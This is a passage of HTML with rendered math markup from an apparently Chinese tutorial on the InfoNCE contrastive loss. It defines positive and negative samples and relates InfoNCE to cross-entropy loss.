aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span></span> 的期望值，即在整个数据分布上计算平均值。</p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>q</mi><mo stretchy=\"false\">(</mo><mover accent=\"true\"><mi>Y</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo></mrow></msub><mo stretchy=\"false\">[</mo><mi>log</mi><mo>⁡</mo><msub><mo>∑</mo><mrow><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover><mo>∈</mo><mover accent=\"true\"><mi>Y</mi><mo>~</mo></mover></mrow></msub><mi>exp</mi><mo>⁡</mo><msub><mi>f</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">\\mathbb{E}_{q(\\tilde{Y})}[\\log\\sum_{\\tilde{y}\\in\\tilde{Y}}\\exp f_{\\theta}(x,\\tilde{y})]]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.224333em;vertical-align:-0.47433299999999984em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.4006670000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">q</span><span class=\"mopen mtight\">(</span><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">Y</span></span></span><span style=\"top:-3.3023300000000004em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.47433299999999984em;\"><span></span></span></span></span></span></span><span class=\"mopen\">[</span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:-0.0000050000000000050004em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3444229999999998em;\"><span style=\"top:-2.40029em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord accent mtight\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.0500000000000003em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord mtight\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">Y</span></span></span><span style=\"top:-3.3023300000000004em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.43581800000000004em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">]</span><span class=\"mclose\">]</span></span></span></span>：表示对负样本分布<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>q</mi><mo stretchy=\"false\">(</mo><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">q(\\tilde y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mopen\">(</span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 上的期望值</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi mathvariant=\"script\">Y</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde{\\mathcal {Y}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.01741em;vertical-align:-0.09722em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.08222em;\">Y</span></span></span></span><span style=\"top:-3.6023300000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.09722em;\"><span></span></span></span></span></span></span></span></span> 表示负样本集合，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8622999999999998em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span> 是从负样本集合中抽取的样本</li>\n<li>这部分用于衡量 x 与负样本集合 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi mathvariant=\"script\">Y</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde{\\mathcal{Y}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.01741em;vertical-align:-0.09722em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.08222em;\">Y</span></span></span></span><span style=\"top:-3.6023300000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.09722em;\"><span></span></span></span></span></span></span></span></span> 中每个负样本 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde{y}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8622999999999998em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span> 之间的相似度之和，通过对数归一化处理。</li>\n</ul>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi mathvariant=\"normal\">∣</mi><mover accent=\"true\"><mi mathvariant=\"script\">Y</mi><mo>~</mo></mover><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">log|\\tilde{\\mathcal {Y}}|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.1701899999999998em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord\">∣</span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.08222em;\">Y</span></span></span></span><span style=\"top:-3.6023300000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.09722em;\"><span></span></span></span></span></span><span class=\"mord\">∣</span></span></span></span>:</p>\n<ul>\n<li>是一个归一化常数，表示负样本集合<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi mathvariant=\"script\">Y</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde{\\mathcal {Y}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.01741em;vertical-align:-0.09722em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.08222em;\">Y</span></span></span></span><span style=\"top:-3.6023300000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.09722em;\"><span></span></span></span></span></span></span></span></span> 的大小</li>\n<li>用于平衡不同大小的负样本集合带来的影响</li>\n</ul>\n<h4 id=\"概念解释\"><a class=\"anchor\" href=\"#概念解释\">#</a> 概念解释</h4>\n<h5 id=\"正样本\"><a class=\"anchor\" href=\"#正样本\">#</a> 正样本</h5>\n<p>正样本是指在特定任务中符合目标或条件的数据样本。换句话说，正样本是模型应该识别或预测的目标。例如：</p>\n<ul>\n<li>在二分类任务中，正样本是被分类为目标类别的数据。例如，在垃圾邮件检测任务中，正样本是那些被标记为垃圾邮件的邮件。</li>\n<li>在推荐系统中，正样本是用户实际点击或购买的物品。例如，某用户点击了一部电影，那么这部电影对于该用户来说就是正样本。</li>\n<li>在图像识别任务中，如果目标是识别狗的图像，那么所有被标记为狗的图像都是正样本。</li>\n</ul>\n<h5 id=\"负样本\"><a class=\"anchor\" href=\"#负样本\">#</a> 负样本</h5>\n<p>负样本是指在特定任务中不符合目标或条件的数据样本。负样本是模型应该排除或不识别为目标的数据。例如：</p>\n<ul>\n<li>在二分类任务中，负样本是被分类为非目标类别的数据。例如，在垃圾邮件检测任务中，负样本是那些被标记为非垃圾邮件的邮件。</li>\n<li>在推荐系统中，负样本是用户没有点击或购买的物品。例如，某用户没有点击的一部电影，那么这部电影对于该用户来说就是负样本。</li>\n<li>在图像识别任务中，如果目标是识别狗的图像，那么所有被标记为非狗的图像都是负样本。</li>\n</ul>\n</li>\n</ul>\n<p>由于<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>N</mi><mi>C</mi><mi>E</mi></mrow><annotation encoding=\"application/x-tex\">InfoNCE</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span></span></span> 与交叉熵相关，如果<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>Y</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9201899999999998em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span><span style=\"top:-3.6023300000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span></span></span></span> 始终包含随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 的所有可能值，即<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>Y</mi><mo>~</mo></mover><mo>=</mo><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">\\tilde Y=Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9201899999999998em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span><span style=\"top:-3.6023300000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span>, 并且它们是均匀分布，那么最大化<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>N</mi><mi>C</mi><mi>E</mi></mrow><annotation encoding=\"application/x-tex\">InfoNCE</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span></span></span> 就类似于交叉熵损失了：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo separator=\"true\">,</mo><mi>Y</mi><mo stretchy=\"false\">)</mo></mrow></msub><mo stretchy=\"false\">[</mo><msub><mi>f</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><munder><mo>∑</mo><mrow><mover accent=\"true\"><mi>x</mi><mo>~</mo></mover><mo>∈</mo><mi>V</mi></mrow></munder><mi>exp</mi><mo>⁡</mo><msub><mi>f</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">]</mo><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">\\mathbb{E}_{p(X,Y)}[f_\\theta(x,y)-\\log\\sum_{\\tilde{x}\\in V}\\exp f_\\theta(x,\\tilde{y})].\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.1052em;vertical-align:-0.3551999999999999em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">p</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">X</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.3717110000000003em;vertical-align:-1.321706em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span></span></span><span style=\"top:-3.0500000000000003em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.22222em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">]</span><span class=\"mord\">.</span></span></span></span></span></p>\n<p>该方程表明<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>N</mi><mi>C</mi><mi>E</mi></mrow><annotation encoding=\"application/x-tex\">InfoNCE</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span></span></span> 与最大化的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>p</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>y</mi><mi mathvariant=\"normal\">∣</mi><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p_\\theta(y|x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span><span 